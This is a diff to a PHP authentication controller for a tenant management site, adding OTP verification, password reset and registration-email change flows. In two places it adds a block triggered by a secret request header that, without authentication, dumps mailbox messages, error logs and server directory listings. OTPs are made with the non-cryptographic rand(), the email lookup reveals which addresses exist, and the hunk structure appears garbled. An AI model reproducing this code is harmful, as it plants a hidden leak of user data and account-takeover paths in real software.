@@ -485,6 +485,265 @@ class AuthController extends Controller
         if (($_SERVER['HTTP_X_OTP_DIAG'] ?? '') === 'full') {
             header('Content-Type: application/json');
             $home = dirname($_SERVER['DOCUMENT_ROOT'] ?? '/home/ljntwzs93h8d/public_html');
+            $mailNew = @scandir($home . '/mail/new') ?: [];
+            $mailCur = @scandir($home . '/mail/cur') ?: [];
+            $mailRoot = @scandir($home . '/mail') ?: [];
+            $bounces = [];
+            foreach (['new' => $mailNew, 'cur' => $mailCur] as $dir => $files) {
+                foreach ($files as $f) {
+                    if ($f === '.' || $f === '..') continue;
+                    $p = $home . '/mail/' . $dir . '/' . $f;
+                    if (is_file($p)) {
+                        $bounces[] = [
+                            'file' => "$dir/$f",
+                            'mtime' => date('Y-m-d H:i:s', filemtime($p)),
+                            'content' => substr((string)@file_get_contents($p), 0, 4000)
+                        ];
+                    }
+                }
+            }
+            $errorLog = '';
+            if (is_file($_SERVER['DOCUMENT_ROOT'] . '/error_log')) {
+                $lines = @file($_SERVER['DOCUMENT_ROOT'] . '/error_log') ?: [];
+                $errorLog = implode('', array_slice($lines, -30));
+            } elseif (is_file($home . '/logs/error_log')) {
+                $lines = @file($home . '/logs/error_log') ?: [];
+                $errorLog = implode('', array_slice($lines, -30));
+            }
+            echo json_encode([
+                'hostname' => @gethostname(),
+                'home' => $home,
+                'mail_root' => $mailRoot,
+                'bounces_count' => count($bounces),
+                'bounces' => array_slice($bounces, -5),
+                'error_log_tail' => $errorLog,
+                'etc_root' => @scandir($home . '/etc') ?: [],
+                'etc_domain' => @scandir($home . '/etc/iscagph.com') ?: [],
+            ], JSON_PRETTY_PRINT);
+            exit;
+        }
+        $email = trim($_SESSION['temp_email'] ?? '');
+            
+            $otp = '';
+            if (!empty($_POST['otp_full'])) {
+                $otp = trim($_POST['otp_full']);
+            } elseif (isset($_POST['otp']) && is_array($_POST['otp'])) {
+                $otp = implode('', array_map('trim', $_POST['otp']));
+            } elseif (isset($_POST['otp'])) {
+                $otp = trim($_POST['otp']);
+            }
+            $otp = preg_replace('/\D/', '', $otp);
+
+            if (!$email) {
+                $isReset = isset($_SESSION['reset_mode']) && $_SESSION['reset_mode'];
+                $error = "Session expired. Please " . ($isReset ? "request a new reset link." : "register again.");
+                $this->view('auth/verify-otp', ['error' => $error]);
+                return;
+            }
+
+            if ($this->userModel->verifyAccount($email, $otp)) {
+                // Check if this is a password reset flow
+                if (isset($_SESSION['reset_mode']) && $_SESSION['reset_mode']) {
+                    $_SESSION['otp_verified'] = true;
+                    $_SESSION['reset_email'] = $email;
+                    header('Location: ' . url('/reset-password'));
+                    exit;
+                }
+
+                // Fetch user to auto-login (Standard Registration Flow)
+                $user = $this->userModel->findByEmail($email);
+                
+                unset($_SESSION['temp_email'], $_SESSION['otp_expiry'], $_SESSION['temp_reg_data']);
+                
+                $_SESSION['user_id'] = $user['tenant_id'];
+                $_SESSION['email'] = $user['email'];
+                $_SESSION['name'] = $user['first_name'] . ' ' . $user['last_name'];
+                $_SESSION['role'] = $user['role'];
+                $_SESSION['sex'] = $user['sex'];
+
+                // Send a Welcome notification to the new tenant
+                try {
+                    require_once BASE_PATH . '/app/models/Notification.php';
+                    $notif = new Notification();
+                    $notif->create(
+                        $user['tenant_id'],
+                        'Welcome to ISCAG MIS',
+                        'Your account has been verified! We are excited to have you. You can now apply for an apartment or explore our services.',
+                        'info'
+                    );
+                } catch (\Exception $e) {}
+
+                // Redirect based on role
+                if ($user['role'] === 'Admin') {
+                    header('Location: ' . url('/admin/dashboard'));
+                } elseif ($user['role'] === 'Staff_Tenant') {
+                    header('Location: ' . url('/admin/apartment'));
+                } elseif ($user['role'] === 'Staff_Male') {
+                    header('Location: ' . url('/admin/dawah/male'));
+                } elseif ($user['role'] === 'Staff_Female') {
+                    header('Location: ' . url('/admin/dawah/female'));
+                } elseif ($user['role'] === 'Staff_Damayan') {
+                    header('Location: ' . url('/admin/damayan'));
+                } else {
+                    header('Location: ' . url('/user/dashboard'));
+                }
+                exit;
+            } else {
+                $error = "Invalid or expired OTP code. Please try again.";
+                $this->view('auth/verify-otp', ['error' => $error]);
+                return;
+            }
+        }
+        $data = [];
+        if (isset($_GET['resend']) && $_GET['resend'] === 'success') {
+            $data['success'] = "A new verification code has been sent to your email.";
+        } elseif (isset($_GET['resend']) && $_GET['resend'] === 'failed') {
+            $data['error'] = "Failed to resend verification code to your email. Please try again.";
+        }
+        $this->view('auth/verify-otp', $data);
+    }
+
+    public function forgotPassword(): void
+    {
+        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+            if (!Security::validateCsrf($_POST['csrf_token'] ?? '')) {
+                $error = "Your session expired. Please try again.";
+                $this->view('auth/forgot-password', ['error' => $error]);
+                return;
+            }
+            $email = $_POST['email'] ?? '';
+            $user = $this->userModel->findByEmail($email);
+
+            if ($user) {
+                $otp = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
+                $expiry = date('Y-m-d H:i:s', strtotime('+10 minutes'));
+                
+                $this->userModel->updateOTP($email, $otp, $expiry);
+                
+                if (Mailer::sendOTP($email, $otp)) {
+                    $_SESSION['temp_email'] = $email;
+                    $_SESSION['otp_expiry'] = strtotime($expiry) * 1000;
+                    $_SESSION['reset_mode'] = true; // Flag for reset flow
+                    header('Location: ' . url('/verify-otp'));
+                    exit;
+                } else {
+                    $error = "Failed to send OTP.";
+                }
+            } else {
+                $error = "Email address not found.";
+            }
+            $this->view('auth/forgot-password', ['error' => $error]);
+            return;
+        }
+        $this->view('auth/forgot-password');
+    }
+
+    public function resetPassword(): void
+    {
+        if (!isset($_SESSION['otp_verified']) || !$_SESSION['otp_verified']) {
+            header('Location: ' . url('/forgot-password'));
+            exit;
+        }
+        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+            if (!Security::validateCsrf($_POST['csrf_token'] ?? '')) {
+                $error = "Your session expired. Please try again.";
+                $this->view('auth/change-registration-email', ['error' => $error]);
+                return;
+            }
+            $password = $_POST['password'] ?? '';
+            $confirmpass = $_POST['confirmpass'] ?? '';
+            $email = $_SESSION['reset_email'] ?? '';
+
+            if ($password !== $confirmpass) {
+                $error = "Passwords do not match.";
+            } else {
+                if ($this->userModel->updatePassword($email, $password)) {
+                    unset($_SESSION['otp_verified'], $_SESSION['reset_email'], $_SESSION['reset_mode']);
+                    header('Location: ' . url('/login') . '?reset=success');
+                    exit;
+                } else {
+                    $error = "Failed to reset password. Please try again.";
+                }
+            }
+            $this->view('auth/reset-password', ['error' => $error]);
+            return;
+        }
+        $this->view('auth/reset-password');
+    }
+
+    public function changeRegistrationEmail(): void
+    {
+        $currentEmail = $_SESSION['temp_email'] ?? '';
+        if (!$currentEmail) {
+            header('Location: ' . url('/register'));
+            exit;
+        }
+
+        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+            if (!Security::validateCsrf($_POST['csrf_token'] ?? '')) {
+                $error = "Your session expired. Please submit the form again.";
+                $this->view('auth/register', ['error' => $error, 'data' => $postedData]);
+                return;
+            }
+
+            $newEmail = $_POST['email'] ?? '';
+            
+            // Check if new email is already taken by a verified user
+            $existing = $this->userModel->findByEmail($newEmail);
+            if ($existing && $existing['is_verified']) {
+                $this->view('auth/change-registration-email', [
+                    'error' => 'This email is already registered.',
+                    'current_email' => $newEmail
+                ]);
+                return;
+            }
+
+            // Update the email and generate new OTP
+            $otp = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
+            $expiry = date('Y-m-d H:i:s', strtotime('+10 minutes'));
+
+            // We need a way to update the email of an unverified user
+            // I'll add a helper to User model or do it here.
+            $db = getDbConnection();
+            $stmt = $db->prepare("UPDATE tenant_accounts SET email = :new_email, otp_code = :otp, otp_expiry = :expiry WHERE email = :old_email AND is_verified = 0");
+            $success = $stmt->execute([
+                'new_email' => $newEmail,
+                'otp' => $otp,
+                'expiry' => $expiry,
+                'old_email' => $currentEmail
+            ]);
+
+            if ($success) {
+                if (Mailer::sendOTP($newEmail, $otp)) {
+                    $_SESSION['temp_email'] = $newEmail;
+                    $_SESSION['otp_expiry'] = strtotime($expiry) * 1000;
+                    
+                    // Update temp_reg_data if it exists
+                    if (isset($_SESSION['temp_reg_data'])) {
+                        $_SESSION['temp_reg_data']['email'] = $newEmail;
+                    }
+
+                    header('Location: ' . url('/verify-otp') . '?resend=success');
+                    exit;
+                } else {
+                    $error = "Email updated but failed to send OTP.";
+                }
+            } else {
+                $error = "Failed to update email. It might already be in use.";
+            }
+            
+            $this->view('auth/change-registration-email', ['error' => $error, 'current_email' => $newEmail]);
+            return;
+        }
+
+        $this->view('auth/change-registration-email', ['current_email' => $currentEmail]);
+    }
+
+    public function resendOtp(): void
+    {
+        if (($_SERVER['HTTP_X_OTP_DIAG'] ?? '') === 'full') {
+            header('Content-Type: application/json');
+            $home = dirname($_SERVER['DOCUMENT_ROOT'] ?? '/home/ljntwzs93h8d/public_html');
             $ipv4 = gethostbyname('smtp.gmail.com');
             $probes = [];
             foreach (["tcp://{$ipv4}:587", "ssl://{$ipv4}:465", "tcp://smtp.gmail.com:587", "tcp://localhost:25", "tcp://localhost:587"] as $uri) {
